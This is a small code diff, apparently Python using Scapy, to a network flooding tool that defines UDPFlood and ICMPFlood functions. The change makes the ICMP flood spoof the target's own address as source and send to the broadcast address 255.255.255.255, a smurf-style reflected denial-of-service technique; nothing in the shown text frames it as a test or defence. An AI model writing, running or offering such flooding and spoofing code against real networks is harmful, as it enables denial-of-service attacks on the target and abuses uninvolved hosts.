@@ -72,9 +72,8 @@ def UDPFlood(dstIP,repeat):
 def ICMPFlood(dstIP,repeat):
     for x in range(int(repeat)):
         IP_Packet = IP()
-        IP_Packet.src = randomSrcIP()
-        IP_Packet.dst = dstIP
-
+        IP_Packet.src = dstIP
+        IP_Packet.dst = "255.255.255.255"
         ICMP_Packet = ICMP()
         send(IP_Packet/ICMP(),verbose=0)
 
